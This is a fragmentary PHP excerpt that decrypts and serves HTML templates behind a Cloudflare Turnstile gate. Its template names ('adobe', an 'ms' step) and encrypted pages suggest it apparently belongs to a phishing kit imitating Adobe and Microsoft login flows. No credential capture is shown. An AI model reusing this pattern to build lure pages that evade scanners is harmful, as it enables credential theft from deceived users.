...
<?php
    ...
    $file = __DIR__ . '/templates/admin.html.enc';
    if (file_exists($file)) {
        $content = Crypto::loadEncrypted($file);
        if ($content === false) {
            $fallback = __DIR__ . '/templates/plain/admin.html';
...
if ($cfTurnstileEnabled && empty($_SESSION['turnstile_verified'])) {
    header('Content-Type: text/html; charset=UTF-8');
    echo Crypto::loadEncrypted(__DIR__ . '/templates/challenge.html.enc');
    exit;
}
...
if ($html === false) {
    if ($template === 'adobe' && $step !== 'verify') {
        $fallback = __DIR__ . '/templates/plain/adobetemplate.html';
    } elseif ($template === 'upload' && $step !== 'ms') {
        $fallback = __DIR__ . '/templates/plain/upload.html';
    } else {
        $fallback = __DIR__ . '/templates/plain/template.html';
    }
    $html = file_exists($fallback) ? file_get_contents($fallback) : '';
}
